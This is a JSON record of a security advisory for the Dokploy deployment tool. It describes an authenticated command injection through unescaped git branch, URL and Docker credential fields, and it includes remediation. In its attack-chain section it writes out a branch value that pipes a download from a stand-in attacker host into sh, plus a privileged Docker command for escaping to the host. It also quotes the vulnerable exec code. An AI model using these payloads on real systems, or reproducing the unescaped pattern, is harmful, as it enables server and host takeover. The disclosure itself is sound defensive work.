@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-3frc-cfh9-ch2c",
+  "repo": {
+    "cve_id": "CVE-2026-45628",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.6,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-20"
+    ],
+    "description": "## Summary\r\n\r\nDokploy constructs shell commands using JavaScript template literals and executes them via `child_process.exec()` (which runs through `/bin/sh -c`). User-supplied branch names, repository URLs, and Docker credentials are interpolated directly into these commands **without escaping**.\r\n\r\n**This requires an authenticated user with application create/edit privileges.** There is no unauthenticated path to trigger the injection. The developers already have `shEscape()` in `registry.ts` but didn't apply it to the vulnerable deployment paths.\r\n\r\n### Impact\r\n\r\nAn authenticated attacker with application create/edit privileges can achieve **remote code execution on the Dokploy server** by injecting shell metacharacters into branch/URL fields. The shell executes with container root privileges, and since Dokploy mounts the Docker socket, this can be escalated to **full host compromise** via `docker run -v /:/host --privileged busybox chroot /host`.\r\n\r\nThe webhook deploy endpoint does NOT expose this to unauthenticated attackers -- branch matching logic prevents the injection payload from matching any real git ref. This is an **authenticated vulnerability** (PR:L) only.\r\n\r\nThe core issue is not the Docker socket (which Dokploy needs by design) but the **missing shell escaping** on user-supplied values -- a fix the codebase already has (`shEscape()` in `registry.ts`) but didn't apply to the deployment pipeline.\r\n\r\n---\r\n\r\n## The Vulnerability\r\n\r\n### Root Cause\r\n\r\nFile: `packages/server/src/utils/process/execAsync.ts` (line 10)\r\n```typescript\r\nconst execAsyncBase = util.promisify(exec);  // /bin/sh -c\r\n```\r\n\r\nThe codebase has both `execAsync` (shell-based) and `execFileAsync` (no shell). The deployment pipeline uses the shell-based variant exclusively.\r\n\r\n### Injection Points\r\n\r\n**Custom Git - `packages/server/src/utils/providers/git.ts:81`**\r\n```typescript\r\ncommand += `if ! git clone --branch ${customGitBranch} --depth 1 --progress ${customGitUrl} ${outputPath}; then`;\r\n```\r\n\r\n**GitHub - `packages/server/src/utils/providers/github.ts:170`**\r\n```typescript\r\ncommand += `git clone --branch ${branch} --depth 1 ${cloneUrl} ${outputPath} --progress;`;\r\n```\r\n\r\n**GitLab - `packages/server/src/utils/providers/gitlab.ts:155`**\r\n```typescript\r\ncommand += `git clone --branch ${gitlabBranch} --depth 1 ${cloneUrl} ${outputPath} --progress;`;\r\n```\r\n\r\n**Bitbucket - `packages/server/src/utils/providers/bitbucket.ts:128`**\r\n```typescript\r\ncommand += `git clone --branch ${bitbucketBranch} --depth 1 ${cloneUrl} ${outputPath} --progress;`;\r\n```\r\n\r\n**Docker Login - `packages/server/src/utils/providers/docker.ts:14-20`**\r\n```typescript\r\ncommand += `if ! echo \"${password}\" | docker login --username \"${username}\" --password-stdin \"${registryUrl || \"\"}\" 2>&1; then`;\r\n```\r\n\r\n**GIT_SSH_COMMAND Port - `git.ts:76`**\r\n```typescript\r\nconst gitSshCommand = `ssh -i /tmp/id_rsa${port ? ` -p ${port}` : \"\"} -o UserKnownHostsFile=${knownHostsPath}`;\r\n```\r\n\r\nAll of these use `${variable}` interpolation with zero escaping.\r\n\r\n### The Existing `shEscape()` That Wasn't Used\r\n\r\nFile: `packages/server/src/services/registry.ts:14`\r\n```typescript\r\nfunction shEscape(s: string | undefined): string {\r\n  if (!s) return \"''\";\r\n  return `'${s.replace(/'/g, `'\\\\''`)}'`;\r\n}\r\n```\r\n\r\nThis function is already written and used for Docker registry credentials in `safeDockerLoginCommand()` (line 19), but was never applied to the git deployment paths.\r\n\r\n---\r\n\r\n## Attack Chain\r\n\r\n### Step-by-step (Authenticated User)\r\n\r\n1. User logs into Dokploy (or signs up if self-hosted)\r\n2. User creates an application with source type set to any git provider\r\n3. User sets the branch field to: `main; curl http://attacker/payload | sh;`\r\n4. User clicks **Deploy** in the Dokploy UI\r\n5. The deployment pipeline constructs: `git clone --branch \"main; curl http://attacker/payload | sh;\" ...`\r\n6. The shell interprets `;` as a command separator\r\n7. The injected command executes on the Dokploy server with Docker socket access\r\n\r\n### What Prevents Webhook Trigger\r\n\r\nThe webhook endpoint at `apps/dokploy/pages/api/deploy/[refreshToken].ts` has this check (line 137):\r\n\r\n```typescript\r\nif (!branchName || branchName !== application.branch) {\r\n  res.status(301).json({ message: \"Branch Not Match\" });\r\n  return;\r\n}\r\n```\r\n\r\nThe webhook payload's `ref` field (e.g. `refs/heads/main`) must match the stored branch EXACTLY. Since the stored branch is `main; curl ...`, the webhook payload would need to contain that exact string - which no real git provider would send. Same matching logic applies to `customGitBranch` (line 144), `gitlabBranch` (line 196), and `bitbucketBranch` (line 203).\r\n\r\n---\r\n\r\n## Remediation\r\n\r\n1. **Apply `shEscape()` to ALL shell-interpolated variables** - the function already exists at `registry.ts:14`\r\n2. **Use `execFileAsync()` instead of `execAsync()`** where possible - `execFile` doesn't invoke a shell\r\n3. **Whitelist branch names** - reject names containing `;`, `$`, `` ` ``, `|`, `&`, `\\n`\r\n4. **Switch to `shell-quote` library** - already imported in `docker-file.ts` (line 5) but not used in deployment paths\r\n\r\n",
+    "ghsa_id": "GHSA-3frc-cfh9-ch2c",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-3frc-cfh9-ch2c",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-3frc-cfh9-ch2c"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45628"
+      }
+    ],
+    "published_at": "2026-05-11T18:37:29Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Command Injection via Unescaped Branch Fields in Deployment Pipeline",
+    "updated_at": "2026-05-13T04:32:34Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "v0.29.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
